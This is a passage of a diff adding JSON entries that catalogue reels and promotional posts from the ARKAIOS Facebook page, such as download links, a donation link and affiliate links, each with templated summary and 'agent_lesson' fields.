+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1025112619854941/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1025112619854941/"
+  },
+  {
+    "id": "meta-776644758860856_122168964638989266",
+    "title": "ARKAIOS Reel #921106017656350",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/921106017656350/",
+    "canonical_url": "https://www.facebook.com/reel/921106017656350/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/921106017656350/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/921106017656350/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/921106017656350/"
+  },
+  {
+    "id": "meta-776644758860856_122168962652989266",
+    "title": "ARKAIOS Reel #1374019034186025",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1374019034186025/",
+    "canonical_url": "https://www.facebook.com/reel/1374019034186025/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1374019034186025/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1374019034186025/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1374019034186025/"
+  },
+  {
+    "id": "meta-776644758860856_122168960696989266",
+    "title": "ARKAIOS Reel #932695875808042",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/932695875808042/",
+    "canonical_url": "https://www.facebook.com/reel/932695875808042/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/932695875808042/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/932695875808042/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/932695875808042/"
+  },
+  {
+    "id": "meta-776644758860856_122168960570989266",
+    "title": "ARKAIOS Reel #1038076225755278",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1038076225755278/",
+    "canonical_url": "https://www.facebook.com/reel/1038076225755278/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1038076225755278/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1038076225755278/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1038076225755278/"
+  },
+  {
+    "id": "meta-776644758860856_122168846402989266",
+    "title": "Descarga Ahora!!!:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122168846186989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122168846186989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122168846186989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Descarga Ahora!!!:\nhttps://arkaios.qzz.io/NU0coFw",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Descarga Ahora!!!:\nhttps://arkaios.qzz.io/NU0coFw...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122168846186989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122168845760989266",
+    "title": "https://www.facebook.com/share/p/1Bg9FqJwWb/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1065143709194312&set=a.194713536237338&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1065143709194312&set=a.194713536237338&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1065143709194312&set=a.194713536237338&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "https://www.facebook.com/share/p/1Bg9FqJwWb/",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: https://www.facebook.com/share/p/1Bg9FqJwWb/...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1065143709194312&set=a.194713536237338&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122168781752989266",
+    "title": "ARKAIOS Reel #951440224592048",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/951440224592048/",
+    "canonical_url": "https://www.facebook.com/reel/951440224592048/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/951440224592048/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/951440224592048/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/951440224592048/"
+  },
+  {
+    "id": "meta-776644758860856_122168781578989266",
+    "title": "ARKAIOS Reel #898803456184355",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/898803456184355/",
+    "canonical_url": "https://www.facebook.com/reel/898803456184355/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/898803456184355/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/898803456184355/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/898803456184355/"
+  },
+  {
+    "id": "meta-776644758860856_122168781560989266",
+    "title": "ARKAIOS Reel #1562787905439655",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1562787905439655/",
+    "canonical_url": "https://www.facebook.com/reel/1562787905439655/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1562787905439655/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1562787905439655/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1562787905439655/"
+  },
+  {
+    "id": "meta-776644758860856_122168781524989266",
+    "title": "ARKAIOS Reel #2387067415035332",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2387067415035332/",
+    "canonical_url": "https://www.facebook.com/reel/2387067415035332/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2387067415035332/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2387067415035332/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2387067415035332/"
+  },
+  {
+    "id": "meta-776644758860856_122168754290989266",
+    "title": "Con TiktokMemes – ¡Me acaban de reconocer como uno de sus fans destacados! 🎉",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122168754260989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122168754260989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122168754260989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Con TiktokMemes – ¡Me acaban de reconocer como uno de sus fans destacados! 🎉",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Con TiktokMemes – ¡Me acaban de reconocer como uno de sus fans destacados! 🎉...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122168754260989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122168677016989266",
+    "title": "BulkTik - Bulk TikTok Video Downloader Without Watermark",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://l.facebook.com/l.php?u=https%3A%2F%2Fbulktik.com%2F&h=AUBI3AXv5PQ1sgbvYgwdHA9ZV-6lH0hSZAPiKull6sjfJGQe4BH36jYxefRdOAvWgo6EbuXIqnyQekzAr-PXnDPC7hKtFDs0hQP0WR3ju3jFZyvRH9Vy_-dBDdhLs4VAX6E5ZsZoRuEBIEg7&s=1",
+    "canonical_url": "https://l.facebook.com/l.php?u=https%3A%2F%2Fbulktik.com%2F&h=AUBI3AXv5PQ1sgbvYgwdHA9ZV-6lH0hSZAPiKull6sjfJGQe4BH36jYxefRdOAvWgo6EbuXIqnyQekzAr-PXnDPC7hKtFDs0hQP0WR3ju3jFZyvRH9Vy_-dBDdhLs4VAX6E5ZsZoRuEBIEg7&s=1",
+    "github_repo": null,
+    "website": "https://l.facebook.com/l.php?u=https%3A%2F%2Fbulktik.com%2F&h=AUBI3AXv5PQ1sgbvYgwdHA9ZV-6lH0hSZAPiKull6sjfJGQe4BH36jYxefRdOAvWgo6EbuXIqnyQekzAr-PXnDPC7hKtFDs0hQP0WR3ju3jFZyvRH9Vy_-dBDdhLs4VAX6E5ZsZoRuEBIEg7&s=1",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "descarga videos de tiktok desde aca: https://bulktik.com/\nCompatibilidad videos por lote solo enlaces vivos!!!.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: descarga videos de tiktok desde aca: https://bulktik.com/\nCompatibilidad videos por lote solo enlaces vivos!!!....",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://l.facebook.com/l.php?u=https%3A%2F%2Fbulktik.com%2F&h=AUBI3AXv5PQ1sgbvYgwdHA9ZV-6lH0hSZAPiKull6sjfJGQe4BH36jYxefRdOAvWgo6EbuXIqnyQekzAr-PXnDPC7hKtFDs0hQP0WR3ju3jFZyvRH9Vy_-dBDdhLs4VAX6E5ZsZoRuEBIEg7&s=1"
+  },
+  {
+    "id": "meta-776644758860856_122168676782989266",
+    "title": "Browse the winget repository - winstall",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://l.facebook.com/l.php?u=https%3A%2F%2Fwinstall.app%2F&h=AUCp72ACTWCyeIwM0QHTRCqZaX8PebJiSmcQc4em5Akrh_DY1Q6aMhTFki17dIMzn7XoPGa675tPRbdP5bV_R5nKfEQIInkTKJXoCRS2RFCSsc6bfJuORy6W3a9hBSHrKj788yt_BV8bmuj-&s=1",
+    "canonical_url": "https://l.facebook.com/l.php?u=https%3A%2F%2Fwinstall.app%2F&h=AUCp72ACTWCyeIwM0QHTRCqZaX8PebJiSmcQc4em5Akrh_DY1Q6aMhTFki17dIMzn7XoPGa675tPRbdP5bV_R5nKfEQIInkTKJXoCRS2RFCSsc6bfJuORy6W3a9hBSHrKj788yt_BV8bmuj-&s=1",
+    "github_repo": null,
+    "website": "https://l.facebook.com/l.php?u=https%3A%2F%2Fwinstall.app%2F&h=AUCp72ACTWCyeIwM0QHTRCqZaX8PebJiSmcQc4em5Akrh_DY1Q6aMhTFki17dIMzn7XoPGa675tPRbdP5bV_R5nKfEQIInkTKJXoCRS2RFCSsc6bfJuORy6W3a9hBSHrKj788yt_BV8bmuj-&s=1",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Descarga software oficial desde aqui:",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Descarga software oficial desde aqui: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://l.facebook.com/l.php?u=https%3A%2F%2Fwinstall.app%2F&h=AUCp72ACTWCyeIwM0QHTRCqZaX8PebJiSmcQc4em5Akrh_DY1Q6aMhTFki17dIMzn7XoPGa675tPRbdP5bV_R5nKfEQIInkTKJXoCRS2RFCSsc6bfJuORy6W3a9hBSHrKj788yt_BV8bmuj-&s=1"
+  },
+  {
+    "id": "meta-776644758860856_122168604428989266",
+    "title": "https://www.facebook.com/share/v/19BQ87KrAT/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1382479263800389/",
+    "canonical_url": "https://www.facebook.com/reel/1382479263800389/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1382479263800389/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/v/19BQ87KrAT/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1382479263800389/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1382479263800389/"
+  },
+  {
+    "id": "meta-776644758860856_122168544026989266",
+    "title": "Quien para guardar este tesoro Nacional??? https://www.facebook.com/share/p/1EaNzRg3hV/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/122178342368989266/posts/122168544026989266",
+    "canonical_url": "https://www.facebook.com/122178342368989266/posts/122168544026989266",
+    "github_repo": null,
+    "website": "https://www.facebook.com/122178342368989266/posts/122168544026989266",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Quien para guardar este tesoro Nacional??? https://www.facebook.com/share/p/1EaNzRg3hV/\n𝐒𝐓𝐈𝐋𝐋 𝐆𝐀𝐌𝐄𝐒 𝐌𝐗\nTiktokMemes",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Quien para guardar este tesoro Nacional??? https://www.facebook.com/share/p/1EaNzRg3hV/\n𝐒𝐓𝐈𝐋𝐋 𝐆𝐀𝐌𝐄𝐒 𝐌𝐗\nTiktokMemes...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/122178342368989266/posts/122168544026989266"
+  },
+  {
+    "id": "meta-776644758860856_122168014190989266",
+    "title": "https://www.facebook.com/share/1JUogx9Wj5/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1023059313965417&set=a.129665503304807&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1023059313965417&set=a.129665503304807&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1023059313965417&set=a.129665503304807&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "https://www.facebook.com/share/1JUogx9Wj5/",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: https://www.facebook.com/share/1JUogx9Wj5/...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1023059313965417&set=a.129665503304807&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122168009678989266",
+    "title": "🚀 ¡Bienvenido al Futuro de la Comunidad Digital Masiva!",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122168009648989266&set=a.122094865592989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122168009648989266&set=a.122094865592989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122168009648989266&set=a.122094865592989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "🚀 ¡Bienvenido al Futuro de la Comunidad Digital Masiva!\n¿Quieres impulsar una Startup, liderar una colecta con impacto o recomendar sitios, lugares y personas extraordinarias? Checa nuestra nueva propuesta comercial y lleva tus proyectos al siguiente nivel. 🌟\n\n✨ Entra, conoce todos los detalles de la propuesta y súmate ahora mismo:\n🔗 https://arkaios.qzz.io/llGMVNX",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: 🚀 ¡Bienvenido al Futuro de la Comunidad Digital Masiva!\n¿Quieres impulsar una Startup, liderar una colecta con impacto o recomendar sitios, lugares y personas extraordinarias? Checa nuestra nueva propuesta comercial y lleva tus proyectos al siguient...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122168009648989266&set=a.122094865592989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122167880798989266",
+    "title": "Publicación Oficial ARKAIOS #122167880798989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1627968192670740&set=a.444122014388703&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1627968192670740&set=a.444122014388703&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1627968192670740&set=a.444122014388703&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1627968192670740&set=a.444122014388703&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122167826756989266",
+    "title": "FictionLab - Next-Gen AI Story Platform - Free and Uncensored!",
+    "category": "Multi-Agent Intelligence & MCP",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://l.facebook.com/l.php?u=https%3A%2F%2Ffictionlab.ai%2F%3Fref%3DfFIH4suFcj&h=AUCYwi9NyN768Gkd5VYTNX9ZamV6FUdFdbV1VJoksZxRuIJI_6XxEgpEtH6Hqk-2-ENeisDATwUt6LFa8PQIBMVkRBZPEodeFyCwh4fXbxmRRBhuI6Zbpibp-mMymxbjMlYG8B1JkD0kB6Ud&s=1",
+    "canonical_url": "https://l.facebook.com/l.php?u=https%3A%2F%2Ffictionlab.ai%2F%3Fref%3DfFIH4suFcj&h=AUCYwi9NyN768Gkd5VYTNX9ZamV6FUdFdbV1VJoksZxRuIJI_6XxEgpEtH6Hqk-2-ENeisDATwUt6LFa8PQIBMVkRBZPEodeFyCwh4fXbxmRRBhuI6Zbpibp-mMymxbjMlYG8B1JkD0kB6Ud&s=1",
+    "github_repo": null,
+    "website": "https://l.facebook.com/l.php?u=https%3A%2F%2Ffictionlab.ai%2F%3Fref%3DfFIH4suFcj&h=AUCYwi9NyN768Gkd5VYTNX9ZamV6FUdFdbV1VJoksZxRuIJI_6XxEgpEtH6Hqk-2-ENeisDATwUt6LFa8PQIBMVkRBZPEodeFyCwh4fXbxmRRBhuI6Zbpibp-mMymxbjMlYG8B1JkD0kB6Ud&s=1",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Se parte de este hermoso Ecosystema de Agentes de Rol y Afiliate!!!:",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Se parte de este hermoso Ecosystema de Agentes de Rol y Afiliate!!!:\n...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://l.facebook.com/l.php?u=https%3A%2F%2Ffictionlab.ai%2F%3Fref%3DfFIH4suFcj&h=AUCYwi9NyN768Gkd5VYTNX9ZamV6FUdFdbV1VJoksZxRuIJI_6XxEgpEtH6Hqk-2-ENeisDATwUt6LFa8PQIBMVkRBZPEodeFyCwh4fXbxmRRBhuI6Zbpibp-mMymxbjMlYG8B1JkD0kB6Ud&s=1"
+  },
+  {
+    "id": "meta-776644758860856_122167653170989266",
+    "title": "ARKAIOS Reel #1100364182323737",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1100364182323737/",
+    "canonical_url": "https://www.facebook.com/reel/1100364182323737/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1100364182323737/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1100364182323737/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1100364182323737/"
+  },
+  {
+    "id": "meta-776644758860856_122167649108989266",
+    "title": "https://www.facebook.com/share/v/1fTxvFeZ7p/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/4557766781178785/",
+    "canonical_url": "https://www.facebook.com/reel/4557766781178785/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/4557766781178785/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/v/1fTxvFeZ7p/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/4557766781178785/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/4557766781178785/"
+  },
+  {
+    "id": "meta-776644758860856_122167619276989266",
+    "title": "https://www.facebook.com/share/r/181rEudeL6/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1553167692918609/",
+    "canonical_url": "https://www.facebook.com/reel/1553167692918609/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1553167692918609/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/r/181rEudeL6/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1553167692918609/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1553167692918609/"
+  },
+  {
+    "id": "meta-776644758860856_122167380998989266",
+    "title": "Publicación Oficial ARKAIOS #122167380998989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122167380968989266&set=a.122094865592989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122167380968989266&set=a.122094865592989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122167380968989266&set=a.122094865592989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122167380968989266&set=a.122094865592989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122167205498989266",
+    "title": "Deseas Ayudar y apoyar el proyecto,,,",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122167205462989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122167205462989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122167205462989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Deseas Ayudar y apoyar el proyecto,,, \nclic aqui: \"https://ko-fi.com/arkaios\"",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Deseas Ayudar y apoyar el proyecto,,, \nclic aqui: \"https://ko-fi.com/arkaios\"...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122167205462989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122167198706989266",
+    "title": "Repo y Proyecto:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1268342188598609/",
+    "canonical_url": "https://www.facebook.com/reel/1268342188598609/",
+    "github_repo": "https://github.com/simplifaisoul/osiris",
+    "website": "https://www.facebook.com/reel/1268342188598609/",
+    "technologies": [
+      "Open Source",
+      "GitHub"
+    ],
+    "skills_unlocked": [
+      "Herramienta Open Source vinculada: https://github.com/simplifaisoul/osiris"
+    ],
+    "summary": "Repo y Proyecto:\nhttps://github.com/simplifaisoul/osiris\nWeb Live Monitor:\nhttps://osirisai.live/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1268342188598609/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1268342188598609/"
+  },
+  {
+    "id": "meta-776644758860856_122167005782989266",
+    "title": "ARKAIOS Reel #4547998595480750",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/4547998595480750/",
+    "canonical_url": "https://www.facebook.com/reel/4547998595480750/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/4547998595480750/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/4547998595480750/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/4547998595480750/"
+  },
+  {
+    "id": "meta-776644758860856_122166963854989266",
+    "title": "Entra aqui y conoce el sistema:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1429553119006509/",
+    "canonical_url": "https://www.facebook.com/reel/1429553119006509/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1429553119006509/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Entra aqui y conoce el sistema:\nhttps://arkaios.qzz.io/X-Zf6mc",
